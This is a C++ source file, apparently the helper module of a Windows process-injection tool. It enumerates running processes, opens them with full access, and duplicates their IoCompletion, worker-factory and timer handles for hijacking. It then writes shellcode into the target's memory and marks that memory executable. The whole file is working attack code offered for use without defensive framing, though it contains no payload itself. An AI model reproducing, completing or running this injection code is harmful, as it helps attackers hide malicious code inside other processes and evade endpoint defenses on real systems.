#include "../include/Utils.hpp"



HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handleTypeName, _In_ uint32_t desiredAccess) {
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessSnapshotInfo = nullptr;
	PPUBLIC_OBJECT_TYPE_INFORMATION objectInfo                = nullptr;

	fnNtQueryInformationProcess pQueryProcInfo = nullptr;
	fnNtQueryObject pQueryObject               = nullptr;

	uint32_t totalHandles         = NULL;		 
	uint32_t handleInfoSize       = NULL;
	NTSTATUS status               = 0x00;			     
	HANDLE duplicatedHandle       = NULL;
	bool handleFound              = false;		     
	uint32_t objectTypeReturnLen  = NULL;


	//NtQueryInformationProcess
	pQueryProcInfo = reinterpret_cast<fnNtQueryInformationProcess>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

	//NtQueryObject
	pQueryObject = reinterpret_cast<fnNtQueryObject>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryObject"));

	if (pQueryProcInfo == nullptr || pQueryObject == nullptr) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}


	std::wcout << L"{+} Attempting to hijack handle of type: " << handleTypeName << std::endl;

	if (!GetProcessHandleCount(targetProcess, (PDWORD)&totalHandles)) { //Total number of handles we need to account for

		WIN32_ERR(GetProcessHandleCount);
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	
	handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));

	pProcessSnapshotInfo = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));
	if (pProcessSnapshotInfo == nullptr) {

		WIN32_ERR(Process Snapshot Info Heap Alloc);
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}

	status = pQueryProcInfo(
		targetProcess,
		(PROCESSINFOCLASS)51,
		pProcessSnapshotInfo,
		handleInfoSize,
		NULL);

	if (status != ERROR_SUCCESS) {

		NTAPI_ERR(NtQueryInformationProcess, status);
		duplicatedHandle = INVALID_HANDLE_VALUE;
		goto FUNC_END;
	}


	for (size_t i = 0; i < pProcessSnapshotInfo->NumberOfHandles; i++) {

		if (!DuplicateHandle(targetProcess,
			pProcessSnapshotInfo->Handles[i].HandleValue,
			GetCurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			FALSE,
			NULL)) {

			continue;
		}

		pQueryObject(duplicatedHandle,
			ObjectTypeInformation,
			NULL,
			NULL,
			(PULONG)&objectTypeReturnLen); //retrieve correct buffer size first


		objectInfo = static_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen));
		if (objectInfo == nullptr) {
			break;
		}

		status = pQueryObject(duplicatedHandle,
			ObjectTypeInformation,
			objectInfo,
			objectTypeReturnLen,
			NULL);

		if (status != ERROR_SUCCESS) {
			NTAPI_ERR(NtQueryObject, status);
			break;
		}


		if (wcsncmp(handleTypeName, objectInfo->TypeName.Buffer, wcslen(handleTypeName)) == 0) {

			std::wcout << L"{!} found \"" << objectInfo->TypeName.Buffer << L"\" handle! Hijacking successful." << std::endl;
			handleFound = true;
			break;
		}

		HeapFree(GetProcessHeap(), 0, objectInfo);
	}


	if (!handleFound) {
		duplicatedHandle = INVALID_HANDLE_VALUE;
	}


FUNC_END:
	if (pProcessSnapshotInfo) {
		HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo);
	}

	if (objectInfo) {
		HeapFree(GetProcessHeap(), 0, objectInfo);
	}

	return duplicatedHandle;
}

// helpers
HANDLE hijackProcessIoPort(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
}

HANDLE hijackProcessTimerQueue(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"IRTimer", TIMER_ALL_ACCESS);
}

HANDLE hijackProcessWorkerFactory(HANDLE processHandle) {
	return hijackProcessHandle(processHandle, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
}

HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) {

	uint32_t PidArray[2048]     = { 0 };		
	wchar_t moduleBaseName[250] = { 0 };
	uint32_t sModulebaseName    = 0;			
	uint32_t bytesReturned      = 0;
	uint32_t bytesNeeded        = 0;			    
	uint32_t totalNumberOfPids  = 0;

	HANDLE hProcess   = nullptr;
	HMODULE hModule   = nullptr;
	bool foundProcess = false;

	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
		WIN32_ERR(K32EnumProcesses);
		return INVALID_HANDLE_VALUE;
	}

	totalNumberOfPids = bytesReturned / sizeof(uint32_t);

	for (size_t i = 0; i < totalNumberOfPids; i++) {
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidArray[i]);
		if (hProcess == NULL) {
			continue;
		}

		uint32_t moduleEnumBytesNeeded = 0;
		if (!K32EnumProcessModules(hProcess, &hModule, sizeof(hModule), (LPDWORD)&moduleEnumBytesNeeded)) {
			continue;
		}

		if (!K32GetModuleBaseNameW(hProcess, hModule, moduleBaseName, sizeof(moduleBaseName) / sizeof(wchar_t))) {
			continue;
		}

		if (wcscmp(moduleBaseName, processName) == 0) {

			std::wcout << L"{+} Got a handle to process: " << processName << L" with PID: " << PidArray[i] << std::endl;
			foundProcess = true;
			break;
		}

		memset(moduleBaseName, 0x00, sizeof(moduleBaseName));
	}

	return(foundProcess ? hProcess : INVALID_HANDLE_VALUE);
}

bool writePayloadIntoProcess(_In_ HANDLE hProcess, _In_ void* pPayload, _In_ size_t payloadSize, _Out_ void** pRemoteAddress) {

	void* remote = VirtualAllocEx(hProcess,
		nullptr,
		payloadSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remote == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}

	size_t bytesWritten = 0;
	if (!WriteProcessMemory(hProcess,
		remote,
		pPayload,
		payloadSize,
		&bytesWritten) || bytesWritten != payloadSize) {

		WIN32_ERR(WriteProcessMemory);
		std::cout << "Bytes written :" << bytesWritten << " | Payload Size :" << payloadSize << std::endl;
		return false;
	}

	uint32_t oldProtect;
	if (!VirtualProtectEx(hProcess, remote, payloadSize, PAGE_EXECUTE_READ, (PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx);
		return false;
	}

	*pRemoteAddress = remote;

	std::cout << "{+} Wrote Shellcode Into Remote Process: " << remote << std::endl;
	return true;
}